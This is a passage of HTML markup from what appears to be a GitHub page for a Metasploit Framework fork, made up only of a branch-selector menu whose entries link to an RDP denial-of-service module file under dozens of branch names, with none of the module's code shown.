              <a href="/jvazquez-r7/metasploit-framework/blob/pineapp_ldapsyncnow_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="pineapp_ldapsyncnow_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="pineapp_ldapsyncnow_exec">pineapp_ldapsyncnow_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/pineapp_livelog_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="pineapp_livelog_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="pineapp_livelog_exec">pineapp_livelog_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/post_download_exec_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="post_download_exec_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="post_download_exec_work">post_download_exec_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/post_mod_setup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="post_mod_setup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="post_mod_setup">post_mod_setup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/post_require/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="post_require"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="post_require">post_require</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ppr_flatten_rec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ppr_flatten_rec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ppr_flatten_rec">ppr_flatten_rec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/proficy_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="proficy_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="proficy_traversal">proficy_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/provider_skeleton_clean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="provider_skeleton_clean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="provider_skeleton_clean">provider_skeleton_clean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/psexec_command/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="psexec_command"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="psexec_command">psexec_command</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/psexec_command_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="psexec_command_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="psexec_command_fix">psexec_command_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/psexec-url/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="psexec-url"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="psexec-url">psexec-url</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/quickr_qp2_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="quickr_qp2_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="quickr_qp2_bof">quickr_qp2_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ra1nx_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ra1nx_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ra1nx_work">ra1nx_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/raidsonic_telnet/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="raidsonic_telnet"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="raidsonic_telnet">raidsonic_telnet</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/rails3/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="rails3"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="rails3">rails3</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/rapid7/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="rapid7"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="rapid7">rapid7</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/realplayer_url_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="realplayer_url_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="realplayer_url_bof">realplayer_url_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/recoveryfiles_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="recoveryfiles_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="recoveryfiles_cleanup">recoveryfiles_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/release/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="release"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="release">release</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/release-4.5/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="release-4.5"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="release-4.5">release-4.5</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/release-4.5-tech-preview/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="release-4.5-tech-preview"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="release-4.5-tech-preview">release-4.5-tech-preview</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/retab/pr/2280/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="retab/pr/2280"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="retab/pr/2280">retab/pr/2280</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/revert-msfupdate/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="revert-msfupdate"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="revert-msfupdate">revert-msfupdate</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/revertastic-reverse-http/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="revertastic-reverse-http"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="revertastic-reverse-http">revertastic-reverse-http</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/review-2142/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="review-2142"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="review-2142">review-2142</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/review-2412/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="review-2412"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="review-2412">review-2412</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/review-pr2318/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="review-pr2318"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="review-pr2318">review-pr2318</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/review-pr2321/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="review-pr2321"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="review-pr2321">review-pr2321</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/review-pr2379/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="review-pr2379"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="review-pr2379">review-pr2379</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/rfcode_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="rfcode_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="rfcode_work">rfcode_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/rlstest/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="rlstest"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="rlstest">rlstest</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/rsmudge-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="rsmudge-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="rsmudge-master">rsmudge-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/saintpatrick-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="saintpatrick-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="saintpatrick-master">saintpatrick-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sami_ftp_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sami_ftp_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sami_ftp_work">sami_ftp_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_mgmt_con_osexec_payload_multi/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_mgmt_con_osexec_payload_multi"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_mgmt_con_osexec_payload_multi">sap_mgmt_con_osexec_payload_multi</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_modules_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_modules_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_modules_review">sap_modules_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_router_scan_clean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_router_scan_clean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_router_scan_clean">sap_router_scan_clean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_smb_relay/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_smb_relay"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_smb_relay">sap_smb_relay</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_eps_delete_file/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_eps_delete_file"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_eps_delete_file">sap_soap_rfc_eps_delete_file</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_eps_get_directory_listing/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_eps_get_directory_listing"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_eps_get_directory_listing">sap_soap_rfc_eps_get_directory_listing</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_pfl_check_os_file_existence/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_pfl_check_os_file_existence"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_pfl_check_os_file_existence">sap_soap_rfc_pfl_check_os_file_existence</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_rzl_read_dir_local_dir_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_rzl_read_dir_local_dir_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_rzl_read_dir_local_dir_cleanup">sap_soap_rfc_rzl_read_dir_local_dir_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_sxpg_call_system_exec_multi/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_sxpg_call_system_exec_multi"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_sxpg_call_system_exec_multi">sap_soap_rfc_sxpg_call_system_exec_multi</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sap_soap_rfc_sxpg_command_exec_multi/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sap_soap_rfc_sxpg_command_exec_multi"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sap_soap_rfc_sxpg_command_exec_multi">sap_soap_rfc_sxpg_command_exec_multi</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sapni_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sapni_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sapni_work">sapni_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/scriptjunkie-migrator/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="scriptjunkie-migrator"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="scriptjunkie-migrator">scriptjunkie-migrator</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sempervictus-dns_enum_over_tcp/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sempervictus-dns_enum_over_tcp"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sempervictus-dns_enum_over_tcp">sempervictus-dns_enum_over_tcp</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/setuid_tunnelblick/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="setuid_tunnelblick"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="setuid_tunnelblick">setuid_tunnelblick</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/setuid_viscosity/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="setuid_viscosity"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="setuid_viscosity">setuid_viscosity</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sevone_changes/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sevone_changes"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sevone_changes">sevone_changes</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sonicwall_cmd_target/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sonicwall_cmd_target"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sonicwall_cmd_target">sonicwall_cmd_target</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sonicwall_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sonicwall_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sonicwall_fix">sonicwall_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sonicwall_test/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sonicwall_test"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sonicwall_test">sonicwall_test</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sophos_wpa_clear_keys/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sophos_wpa_clear_keys"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sophos_wpa_clear_keys">sophos_wpa_clear_keys</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/sophos_wpa_sblistpack_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="sophos_wpa_sblistpack_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="sophos_wpa_sblistpack_exec">sophos_wpa_sblistpack_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/spiderman_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="spiderman_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="spiderman_fix">spiderman_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/spip_connect_exec_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="spip_connect_exec_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="spip_connect_exec_review">spip_connect_exec_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/splunk_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="splunk_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="splunk_cleanup">splunk_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/splunk_upload_app_exec_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="splunk_upload_app_exec_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="splunk_upload_app_exec_cleanup">splunk_upload_app_exec_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/struts_default_action_mapper/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="struts_default_action_mapper"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="struts_default_action_mapper">struts_default_action_mapper</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/telnet-banner-unicode/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="telnet-banner-unicode"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="telnet-banner-unicode">telnet-banner-unicode</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
